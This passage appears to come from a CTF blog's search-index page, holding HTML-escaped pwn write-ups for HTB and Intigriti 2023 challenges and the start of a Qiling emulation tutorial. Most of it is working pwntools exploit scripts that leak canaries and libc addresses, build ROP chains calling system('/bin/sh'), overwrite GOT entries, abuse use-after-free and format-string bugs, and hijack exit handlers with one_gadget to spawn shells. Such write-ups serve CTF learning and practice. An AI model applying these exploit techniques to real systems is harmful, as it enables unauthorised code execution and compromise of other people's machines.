        context(arch=&#39;arm&#39;,endian=&#39;little&#39;,bits=&#39;32&#39;,os=&#39;linux&#39;)
        io = remote(remote_addr[0],remote_addr[1])
        elf = ELF(&amp;quot;./arms_roped&amp;quot;)
        # libc = ELF(&amp;quot;./arm-linux-gnueabihf/lib/libc.so.6&amp;quot;)
    if &#39;n&#39; not in sys.argv[1]:
        context.log_level=&amp;quot;debug&amp;quot; 
        #context(arch = &#39;amd64&#39;, os = &#39;linux&#39;)

### leak canary
payload=b&amp;quot;a&amp;quot;*0x21
io.sendline(payload)

io.recvuntil(b&amp;quot;a&amp;quot;*0x21)
canary=u32(io.recv(3)[-4:].rjust(4,b&amp;quot;\x00&amp;quot;))
log.success(&amp;quot;canary: &amp;quot;+hex(canary))


### leak base
payload=b&amp;quot;a&amp;quot;*0x30
io.sendline(payload)

io.recvuntil(b&amp;quot;a&amp;quot;*0x30)
# base_addr=u32(io.recv(4).ljust(4,b&amp;quot;\x00&amp;quot;))+0x40000000-0x948
base_addr=u32(io.recv(4).ljust(4,b&amp;quot;\x00&amp;quot;))-0x948
log.success(&amp;quot;base_addr: &amp;quot;+hex(base_addr))


### leak libc
payload=b&amp;quot;a&amp;quot;*0x48
io.sendline(payload)

io.recvuntil(b&amp;quot;a&amp;quot;*0x48)
leak_addr=u32(io.recv(4).ljust(4,b&amp;quot;\x00&amp;quot;))-153-0x1748C
log.success(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))

# sys_addr=leak_addr+0x2F5C8 9.9
sys_addr=leak_addr+0x2F510+1  # alignment
### 0002F510

# str_sh=leak_addr+0x0DCE38 9.9
str_sh=leak_addr+0x0DCE0C
### 00DCE0C

log.success(&amp;quot;sys_addr: &amp;quot;+hex(sys_addr))
log.success(&amp;quot;str_sh: &amp;quot;+hex(str_sh))


# 0x000009ec: pop {r4, r5, r6, r7, r8, sb, sl, pc};
# 0x000009d8: mov r0, r7; add r4, r4, #1; blx r3;
# 0x0000056c: pop {r3, pc};

mov_all=base_addr+0x9d8
pop_r4_r5_r6_r7_r8_sb_sl_pc=base_addr+0x9ec
pop_r3_pc=base_addr+0x56c


log.success(&amp;quot;mov_all: &amp;quot;+hex(mov_all))
log.success(&amp;quot;pop_r4_r5_r6_r7_r8_sb_sl_pc: &amp;quot;+hex(pop_r4_r5_r6_r7_r8_sb_sl_pc))
log.success(&amp;quot;pop_r3_pc: &amp;quot;+hex(pop_r3_pc))


payload=cyclic(0x20)+p32(canary)+p32(0xdeadbeef)*3
payload+=p32(pop_r4_r5_r6_r7_r8_sb_sl_pc)

payload+=p32(0)*3
payload+=p32(str_sh) # r7-&amp;gt;str_sh
payload+=p32(0)*3
payload+=p32(pop_r3_pc)

payload+=p32(sys_addr)+p32(mov_all)

io.sendline(payload)

# io.sendline(b&amp;quot;quit&amp;quot;)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">HTB_Challenges</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/shHGM9hmT/"" data-c="
          &lt;h2 id=&#34;tldr&#34;&gt;TL;DRÔºö&lt;/h2&gt;
&lt;p&gt;nothing here.&lt;/p&gt;
&lt;h2 id=&#34;pwn&#34;&gt;PWN:&lt;/h2&gt;
&lt;h3 id=&#34;pwn_great_old_talisman&#34;&gt;pwn_great_old_talisman:&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;no check for the input, we could use this to perform a oob write&lt;/li&gt;
&lt;li&gt;overwrites the low 2bytes of &lt;code&gt;exit@got[plt]&lt;/code&gt; to that of  &lt;code&gt;read_flag&lt;/code&gt; func&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./great_old_talisman&amp;quot;)
io=remote(&amp;quot;94.237.54.197&amp;quot;,53139)
elf=ELF(&amp;quot;./great_old_talisman&amp;quot;)
libc=elf.libc

# gdb.attach(io)
# pause()

io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,str(-4))

io.sendafter(b&amp;quot;Spell: &amp;quot;,b&amp;quot;\x5a\x13&amp;quot;)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;pwn_zombienator&#34;&gt;pwn_zombienator:&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;use &lt;code&gt;delete&lt;/code&gt; to make a libc_addr leakage and we have all the addr we need for rop chain&lt;/li&gt;
&lt;li&gt;in &lt;code&gt;attack&lt;/code&gt; function we have a chance to directly write on the stack , due to the &lt;code&gt;scanf&lt;/code&gt; as input , use &lt;code&gt;+&lt;/code&gt; or &lt;code&gt;-&lt;/code&gt; to not to overwrite until the return addr , to bypass the canary check . And we have our rop chain written on return addr .&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;( be careful when we write our rop chain , it uses &lt;code&gt;scanf(&amp;quot;%lf&amp;quot;)&lt;/code&gt; , so we have to use double formation as input&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
import struct
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./zombienator&amp;quot;)
io=remote(&amp;quot;94.237.58.77&amp;quot;,50672)
elf=ELF(&amp;quot;./zombienator&amp;quot;)
libc=elf.libc

def double_float(value):
    return str(struct.unpack(&#39;!d&#39;, p64(value)[::-1])[0])

def add(s,n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;tier: &amp;quot;,str(s))
    io.sendlineafter(b&amp;quot;9): &amp;quot;,str(n))

def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;position: &amp;quot;,str(n))

def show():
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;3&amp;quot;)

def attack():
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;4&amp;quot;)

# gdb.attach(io)
# pause()

for i in range(8):
    add(0x80,i)

add(0x20,8)

for i in range(8):
    delete(i)

show()

io.recvuntil(b&amp;quot;Slot [7]: &amp;quot;)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x219ce0
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))

pop_rdi=leak_addr+0x2a3e5
# 0x000000000002a3e5: pop rdi; ret;

ret=leak_addr+0xf9e3c
# 0x00000000000f9e3c: ret;

print(&amp;quot;str_sh: &amp;quot;,hex(str_sh))
print(&amp;quot;sys_addr: &amp;quot;,hex(sys_addr))

rop=[double_float(ret),double_float(pop_rdi),double_float(str_sh),double_float(sys_addr)]

attack()
io.sendlineafter(b&amp;quot;attacks: &amp;quot;,b&amp;quot;39&amp;quot;)

for i in range(35):
    io.sendlineafter(b&amp;quot;coordinates: &amp;quot;,b&amp;quot;+&amp;quot;)

# gdb.attach(io)
# pause()

for i in range(4):
    io.sendlineafter(b&amp;quot;coordinates: &amp;quot;,rop[i])    

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;pwn_zombiedote&#34;&gt;pwn_zombiedote:&lt;/h3&gt;
&lt;p&gt;just like the chall before  , this one also uses &lt;code&gt;%lf&lt;/code&gt; as input and it has even &lt;code&gt;%lf&lt;/code&gt; as output , so just write 2 func to perform as &lt;code&gt;encode and decode&lt;/code&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;malloc a huge size to cover as many sections as it can in memory , therefore we can perform a aaw read or write&lt;/li&gt;
&lt;li&gt;one chance for the &lt;code&gt;inspect&lt;/code&gt; function , use it to leak the libc in libc section , the offset needs to be manually tested .&lt;/li&gt;
&lt;li&gt;idk what the intend solution is , I tried to hijack the &lt;code&gt;exit_hook&lt;/code&gt;(I named it , offset tested manually) , where we have access to write to , and it will finally be called in the &lt;code&gt;exit&lt;/code&gt; function , we could overwrite it with &lt;code&gt;one_gadget&lt;/code&gt; , choose the proper one to fulfill the restrictions .&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
import struct
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;83.136.255.126&amp;quot;,55297)
# io=process(&amp;quot;./zombiedote&amp;quot;)
elf=ELF(&amp;quot;./zombiedote&amp;quot;)
libc=elf.libc

def double_float(value):
    return str(struct.unpack(&#39;!d&#39;, p64(value)[::-1])[0])

def double_to_hex(val):
    return int.from_bytes(struct.pack(&amp;quot;d&amp;quot;, val), &amp;quot;little&amp;quot;)

def add(s):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;samples: &amp;quot;,str(s))

def insert(s):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;tested: &amp;quot;,str(s))


def edit(n,cc):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;number: &amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;(%): &amp;quot;,double_float(cc))

def show(s):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;5&amp;quot;)
    io.sendlineafter(b&amp;quot;inspect: &amp;quot;,str(s))
    io.recvuntil(b&amp;quot;: &amp;quot;)
    hex_string=double_to_hex(float(io.recvuntil(b&amp;quot;\n&amp;quot;,drop=True)))
    print(&amp;quot;hex_string: &amp;quot;,hex(hex_string))
    return hex_string

# gdb.attach(io)

add(0x40040000)
print(&amp;quot;test: &amp;quot;,double_to_hex(1.619794219890527e-319))

### libc_leakage
leak_addr=show(0x40083af0)-0x2197e3
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
exit_hook=leak_addr+0x21a6c8
shell=leak_addr+0xeea9c

pop_rdi=leak_addr+0x2e6c5
# 0x000000000002e6c5: pop rdi; ret;

ret=leak_addr+0x2c7a9
# 0x000000000002c7a9: ret;

# rop_addr=leak_addr-0x200203ff0
# rop=[ret,pop_rdi,str_sh,sys_addr]
insert(0x4)
for i in range(4):
    io.sendlineafter(b&amp;quot;(%): &amp;quot;,double_float(0xdeadbeef))

#  RBX  0x7ffff7fb26c8 (__elf_set___libc_atexit_element__IO_cleanup__) ‚Äî‚ñ∏ 0x7ffff7e86a9c (execvpe+652) ‚óÇ‚Äî mov rdx, r12
#    0x7ffff7de157d &amp;lt;__run_exit_handlers+429&amp;gt;    jae    7ffff7de158bh                 &amp;lt;__run_exit_handlers+443&amp;gt;
#    0x7ffff7de157f &amp;lt;__run_exit_handlers+431&amp;gt;    nop
#  ‚ñ∫ 0x7ffff7de1580 &amp;lt;__run_exit_handlers+432&amp;gt;    call   qword ptr [rbx]

# gdb.attach(io)

edit(5,0)
edit(0x40083cd7,shell)
io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;3&amp;quot;)

io.interactive()

# 0xeea9c execve(&amp;quot;/bin/sh&amp;quot;, r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL

# 0xeea9f execve(&amp;quot;/bin/sh&amp;quot;, r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xeeaa2 execve(&amp;quot;/bin/sh&amp;quot;, rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL
&lt;/code&gt;&lt;/pre&gt;
">HTB_University_CTF_2023 </a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/JbINLA9Ja/"" data-c="
          &lt;h3 id=&#34;tldr&#34;&gt;TL;DR:&lt;/h3&gt;
&lt;p&gt;nothing here .&lt;/p&gt;
&lt;h3 id=&#34;hidden&#34;&gt;Hidden:&lt;/h3&gt;
&lt;p&gt;PIE enabled , partial write is ok , 1/16 chance to meet the 1bit bruteforce , I was too lazy to write the bruteforce script so I&#39;ll just put up the normal one:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./chall&amp;quot;)
io=remote(&amp;quot;hidden.ctf.intigriti.io&amp;quot;,1337)

# gdb.attach(io)
# pause()

payload=cyclic(0x48)+b&amp;quot;\xd9\x91&amp;quot;
io.sendafter(b&amp;quot;something:\n&amp;quot;,payload)


io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;floor-mat-store&#34;&gt;Floor Mat Store:&lt;/h3&gt;
&lt;p&gt;the flag stored on the stack can be leaked through the fsa , the only thing we need to do is to use gdb to make clear the offset , no script need to write&lt;br&gt;
first input 6 to read the flag to the stack , then leak it with &lt;code&gt;%10$s&lt;/code&gt;&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1700327407102.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;over-the-edge&#34;&gt;Over The Edge:&lt;/h3&gt;
&lt;p&gt;only provided a socket script to us , the main logic was to use the int overflow to bypass the check . Use the function in original script to help understand .&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
import sys
import numpy as np
import warnings
import socket
import threading
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;)


io=remote(&amp;quot;edge.ctf.intigriti.io&amp;quot;,1337)

input_data = ((1&amp;lt;&amp;lt;64)-1402)

def process_input(input_value):
    num1 = np.array([0], dtype=np.uint64)
    num2 = np.array([0], dtype=np.uint64)
    num2[0] = 0
    a = input_value
    if a &amp;lt; 0:
        return &amp;quot;Exiting...&amp;quot;
    num1[0] = (a + 65)
    print(&amp;quot;num2[0] =&amp;quot; ,num2[0])
    print(&amp;quot;num1[0] =&amp;quot; ,num1[0])
    print(&amp;quot;num2[0] - num1[0] = &amp;quot;,num2[0]-num1[0])
    if (num2[0] - num1[0]) == 1337:
        return &#39;You won!\n&#39;
    return &#39;Try again.\n&#39;

input_value = int(input_data)
print(&amp;quot;input_value: &amp;quot;,input_value)


response = process_input(input_value)

print(&amp;quot;response: &amp;quot;,response)


io.sendlineafter(b&amp;quot;edge!\n&amp;quot;,str(input_data))


io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;maltigriti&#34;&gt;Maltigriti:&lt;/h3&gt;
&lt;p&gt;to get the flag we need our report level to be &lt;code&gt;A&lt;/code&gt; and the bounty num to be bigger than the value it gives&lt;br&gt;
there exists an uaf vuln in &lt;code&gt;logout&lt;/code&gt; function , which is key to success&lt;br&gt;
first we created the user with the bio , we could cover some value at the same time(later these values will be the in report structure)&lt;br&gt;
remeber the bio size should be the same as the &lt;code&gt;report chunk size&lt;/code&gt; for the first fit principle&lt;br&gt;
once we created it&lt;br&gt;
and then we use &lt;code&gt;logout&lt;/code&gt; to create the uaf , the next time when we add a new report it&#39;ll be signed on the freed chunk&lt;br&gt;
after that we leak the heap addr with &lt;code&gt;edit&lt;/code&gt; function , we need the heap addr that points to user chunk to fulfill the need of &lt;code&gt;calculate_balance&lt;/code&gt;&lt;br&gt;
meanwhile in  &lt;code&gt;edit&lt;/code&gt; function we have a chance to overwrite the report , fill it with the payload&lt;br&gt;
finally call the &lt;code&gt;buy_swag_pack&lt;/code&gt; function and there should be flag printed&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./maltigriti&amp;quot;)
io=remote(&amp;quot;maltigriti.ctf.intigriti.io&amp;quot;,1337)
elf=ELF(&amp;quot;./maltigriti&amp;quot;)
libc=elf.libc

def reg(s,cc):
    io.sendlineafter(b&amp;quot;menu&amp;gt; &amp;quot;,b&amp;quot;0&amp;quot;)
    io.sendlineafter(b&amp;quot;name&amp;gt; &amp;quot;,b&amp;quot;aaa&amp;quot;)
    io.sendlineafter(b&amp;quot;password&amp;gt; &amp;quot;,b&amp;quot;aaa&amp;quot;)
    io.sendlineafter(b&amp;quot;your bio&amp;gt; &amp;quot;,str(s))
    io.sendlineafter(b&amp;quot;new bio&amp;gt; &amp;quot;,cc)
    
def edit_bio():
    io.sendlineafter(b&amp;quot;menu&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
    # io.sendlineafter(b&amp;quot;new bio&amp;gt; &amp;quot;,cc)
    
def add_report(c1,c2):
    io.sendlineafter(b&amp;quot;menu&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;title&amp;gt; &amp;quot;,c1)
    io.sendlineafter(b&amp;quot;report&amp;gt; &amp;quot;,c2)
    
def show():
    io.sendlineafter(b&amp;quot;menu&amp;gt; &amp;quot;,b&amp;quot;3&amp;quot;)
    
def get_flag():
    io.sendlineafter(b&amp;quot;menu&amp;gt; &amp;quot;,b&amp;quot;5&amp;quot;)
    
def uaf():
    io.sendlineafter(b&amp;quot;menu&amp;gt; &amp;quot;,b&amp;quot;6&amp;quot;)
    

# gdb.attach(io)
# pause()

reg(0xc0,b&amp;quot;A&amp;quot;*0x50)
uaf()
add_report(b&amp;quot;A&amp;quot;*0x18,b&amp;quot;A&amp;quot;*0x50)

edit_bio()
io.recvuntil(b&amp;quot;is: &amp;quot;)
ptr_addr=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;ptr_addr: &amp;quot;,hex(ptr_addr))

io.sendlineafter(b&amp;quot;new bio&amp;gt; &amp;quot;,p64(ptr_addr)+b&amp;quot;A&amp;quot;*0x10)

get_flag()

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;reading-in-the-dark&#34;&gt;Reading in the Dark:&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;this one was confusing at a period , for a long time I tried to modify the string `story.txt`  but later I found that the section was `read only` lmao
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;the whole program provide us with several functions , they deal with the our requests with its own rules , the input should be like &lt;code&gt;|{}|{}|{}|&lt;/code&gt;&lt;br&gt;
and for every &lt;code&gt;{}&lt;/code&gt; , there&#39;s a brief explanation:&lt;br&gt;
the first one was used to pass the &lt;code&gt;timestamp&lt;/code&gt; , which is used as the &lt;strong&gt;authentication&lt;/strong&gt; , we need this to bypass those annoying checks&lt;br&gt;
the second one was used as options to enter different functions, ranging from &lt;code&gt;1-4&lt;/code&gt;&lt;br&gt;
the third and the last one , uhh , no use , pass&lt;br&gt;
the main vuln we need to exploit is the buffer overflow in &lt;code&gt;admin_read&lt;/code&gt; function , there is a &lt;code&gt;fread&lt;/code&gt; which will cause a &lt;code&gt;8-bytes&lt;/code&gt; overflow , we could prepare a rop chain on stack and use stack migration to the rop chain we prepared just now&lt;br&gt;
so let&#39;s begin , the following are the main steps (comes out after debugging with gdb):&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;get timestamp and leak address and canary at the same time (there is format string vuln in &lt;code&gt;parse_function&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;as we get the timestamp in step 1 , we use &lt;code&gt;(1&amp;lt;&amp;lt;32)+time_stamp&lt;/code&gt; as our new &lt;code&gt;timestamp&lt;/code&gt; ,  &lt;code&gt;parse_timestamp_new&lt;/code&gt; uses &lt;code&gt;atol&lt;/code&gt; to proceed the &lt;code&gt;timestamp&lt;/code&gt; ,unlike &lt;code&gt;atoi&lt;/code&gt; in &lt;code&gt;parse_timestamp&lt;/code&gt; function , the int overflow will happen in &lt;code&gt;parse_timestamp&lt;/code&gt;  but not in &lt;code&gt;parse_timestamp_new&lt;/code&gt; , therefore we could bypass checks in these two functions.&lt;/li&gt;
&lt;li&gt;after that we enter the &lt;code&gt;admin_read&lt;/code&gt; function , the &lt;code&gt;1-byte&lt;/code&gt; aaw read is actually useless , we only need to focus on the &lt;code&gt;fread&lt;/code&gt; , set up a rop chain on stack and use &lt;code&gt;leave; ret;&lt;/code&gt; to perform a stack migration to the rop chain , then we get root shell&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from ctypes import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./RITD&amp;quot;)
io=remote(&amp;quot;ritd.ctf.intigriti.io&amp;quot;,1337)
elf=ELF(&amp;quot;./RITD&amp;quot;)
libc=ELF(&amp;quot;./libc6_2.35-0ubuntu3.1_amd64.so&amp;quot;)

def menu(c0,c1,c2):
    opt=&amp;quot;|{}|{}|{}|&amp;quot;.format(c0,c1,c2)
    ### c0 used as timestamp
    ### c1 1-4
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,opt)

# gdb.attach(io)
# pause()

menu(&#39;1&#39;,&#39;11111111.%77$p.%76$p.%80$p.%75$p&#39;,&#39;1&#39;) #get timestamp
io.recvuntil(b&amp;quot;.&amp;quot;)

base_addr=int(io.recv(14),16)-0x1a45
print(&amp;quot;base_addr: &amp;quot;,hex(base_addr))
menn=base_addr+0x19ab+373
story_addr=base_addr+0x20e3

io.recvuntil(b&amp;quot;.&amp;quot;)
stack_addr=int(io.recv(14),16)
ret_addr=stack_addr-0x48
ptr_addr=ret_addr-0x38
print(&amp;quot;stack_addr: &amp;quot;,hex(stack_addr))
print(&amp;quot;ret_addr: &amp;quot;,hex(ret_addr))
print(&amp;quot;ptr_addr: &amp;quot;,hex(ptr_addr))


io.recvuntil(b&amp;quot;.&amp;quot;)
leak_addr=int(io.recv(14),16)-0x219aa0
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

shell=leak_addr+0xebdb3
pop_rdi=leak_addr+0x2a3e5
leave_ret=leak_addr+0x0562ec
ret=leak_addr+0x29cd6
str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]

io.recvuntil(b&amp;quot;.&amp;quot;)
canary=int(io.recv(18),16)
print(&amp;quot;canary: &amp;quot;,hex(canary))

io.recvuntil(b&amp;quot;\n&amp;quot;)
time_stamp=int(io.recvuntil(b&amp;quot;\n&amp;quot;,drop=True),10)
print(&amp;quot;time_stamp: &amp;quot;,time_stamp)

idx=((1&amp;lt;&amp;lt;32)+time_stamp) #overflow 

# menu(idx,&#39;2&#39;,&#39;1&#39;) #check timestamp

# menu(idx,&#39;3&#39;,&#39;1&#39;) # FILE*

# gdb.attach(io)
# pause()

menu(idx,&#39;4&#39;,&#39;1&#39;) # aaw

# gdb.attach(io)
# pause()

io.sendlineafter(b&amp;quot;0x)\n&amp;quot;,hex(ret_addr+0x8)[2:])
io.sendlineafter(b&amp;quot;there?\n&amp;quot;,str(ret_addr))
io.sendafter(b&amp;quot;read?\n&amp;quot;,b&amp;quot;a&amp;quot;*7+p64(ret)+p64(pop_rdi)+p64(str_sh)+p64(sys_addr)+p64(canary)+p64(ret_addr-0x30)+p64(leave_ret))


io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">Intigriti CTF 2023 PWN</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/LIbdQfEF3/"" data-c="
          &lt;h3 id=&#34;ÂâçË®Ä&#34;&gt;ÂâçË®ÄÔºö&lt;/h3&gt;
&lt;p&gt;‰∏ÄÁõ¥‰ª•Êù•‰ΩøÁî®qemuÊù•‰ªøÁúüË∑ØÁî±Âô®Âõ∫‰ª∂ÔºåÊúâÊó∂ÂÄôÈíàÂØπ‰∏çÂêåÂõ∫‰ª∂ÈúÄË¶ÅÂÅöÂ§ßÈáèÈÖçÁΩÆÊñá‰ª∂ÁöÑ‰øÆÊîπÔºåÂπ∂‰∏îÊúâÊó∂‰æØÊàëÂè™ÈúÄË¶ÅÈíàÂØπÊüê‰∏Ä‰∏™ÊúçÂä°ËøõË°åÂàÜÊûê&lt;br&gt;
Áî±Ê≠§ËêåÂèë‰∫ÜÂ≠¶‰π†qilingÊ°ÜÊû∂ÁöÑÂøµÂ§¥Ôºå‰∏ÄÁõ¥‰ª•Êù•ÂØπËØ•Ê°ÜÊû∂ÁöÑË∑®Âπ≥Âè∞Ë∑®Êû∂ÊûÑÊúâÊâÄËÄ≥ÈóªÔºåÂä´ÊåÅÁ≥ªÁªüË∞ÉÁî®ÔºåhookÂáΩÊï∞‰πüÂçÅÂàÜÊñπ‰æø&lt;br&gt;
Êú¨Êñáqilinglab‰∏ªË¶ÅÂ∞±ÊòØ‰∏∫ÁÜüÊÇâqilingÊ°ÜÊû∂ËÄåÂÜôÔºåÁ®ãÂ∫èÂàÜÂà´Êúâ11‰∏™challengeÔºåÊØèÂÆåÊàê‰∏Ä‰∏™challengeÂêéÈÉΩ‰ºöÊòæÁ§∫solved&lt;/p&gt;
&lt;h3 id=&#34;challenge1&#34;&gt;challenge1Ôºö&lt;/h3&gt;
&lt;p&gt;ËøôÈÉ®ÂàÜÊàë‰ª¨ÈúÄË¶ÅÂ∞Ü&lt;code&gt;0x1337&lt;/code&gt;Âú∞ÂùÄÂ§ÑÁöÑÂÄºÊîπ‰∏∫&lt;code&gt;1337&lt;/code&gt;&lt;br&gt;
ËØ•Âú∞ÂùÄÊâÄÂú®ÂÜÖÂ≠òÊú™Ë¢´Êò†Â∞Ñ&lt;br&gt;
È¶ñÂÖàÊàë‰ª¨ÈúÄË¶ÅÊò†Â∞Ñ‰∏ÄÂùóÂÜÖÂ≠òÔºå‰∏îÈúÄË¶ÅÊª°Ë∂≥È°µÂØπÈΩê&lt;br&gt;
ÁÑ∂ÂêéÂÜôÂÖ•Êò†Â∞ÑÂÜÖÂ≠ò&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from qiling import *
from qiling.const import *
import sys

def challenge1(ql):  
    ql.mem.map(0x1000,0x1000,info=&#39;challenge1&#39;) #Ê≥®ÊÑèÂÜÖÂ≠òÈ°µÂØπÈΩê
    ql.mem.write(0x1337,ql.pack64(1337))

if __name__ == &amp;quot;__main__&amp;quot;:
    path=[&#39;qilinglab-aarch64&#39;]
	rootfs=&amp;quot;../../rootfs/arm64_linux&amp;quot;
    ql=Qiling(path,rootfs,verbose=QL_VERBOSE.OFF)
    
    challenge1(ql)
    
    ql.run()
    
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;challenge2&#34;&gt;challenge2Ôºö&lt;/h3&gt;
&lt;p&gt;ËØ•ÈÉ®ÂàÜÊåëÊàòË∞ÉÁî®&lt;code&gt;uname&lt;/code&gt;ÂáΩÊï∞ÔºåÂ∞ÜÁõ∏ÂÖ≥‰ø°ÊÅØÂ≠òÂÖ•‰∏Ä‰∏™&lt;code&gt;utsname&lt;/code&gt;ÁöÑÁªìÊûÑ‰Ωì‰∏≠&lt;br&gt;
Êàë‰ª¨ÈúÄË¶ÅÂú®ÁªìÊûÑ‰ΩìÂØπÂ∫îÈÉ®ÂàÜÔºà&lt;code&gt;sysname &amp;amp;&amp;amp; version&lt;/code&gt;ÔºâÂÜôÂÖ•ÊåáÂÆöÂÄºÁªïËøáÊØîËæÉÔºåÊúÄÂêéËøîÂõûÊ≠£Â∏∏ÂÄºÊù•ÂÆåÊàêÊåëÊàò&lt;br&gt;
Á≥ªÁªüË∞ÉÁî®ËøîÂõûÊó∂,ÁªìÊûÑ‰ΩìÁõ∏ÂÖ≥Êï∞ÊçÆÊàêÂëòÁöÑÂú∞ÂùÄÂèØÁî±&lt;code&gt;sp&lt;/code&gt;ÂØÑÂ≠òÂô®ÂÄºÂä†‰∏äÂÅèÁßªÂæóÂá∫&lt;br&gt;
Âú®Á≥ªÁªüË∞ÉÁî®ÂÆå‰πãÂêéÊâßË°åhookÂáΩÊï∞Ôºå&lt;code&gt;QL_INTERCEPT.EXIT&lt;/code&gt;&lt;br&gt;
‰ΩøÁî®¬†&lt;code&gt;ql.arch.regs.sp&lt;/code&gt;ÂæóÂà∞&lt;code&gt;sp&lt;/code&gt;‰∏≠Â≠òÂÇ®ÁöÑÊï∞ÊçÆÊàêÂëòÂú∞ÂùÄÂç≥ÂèØ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def my_uname_on_exit_hook(ql,*args):
#     struct utsname {
#     char sysname[65];
#     char nodename[65];
#     char release[65];   
#     char version[65];
#     char machine[65];
#     char domainname[65];
# };

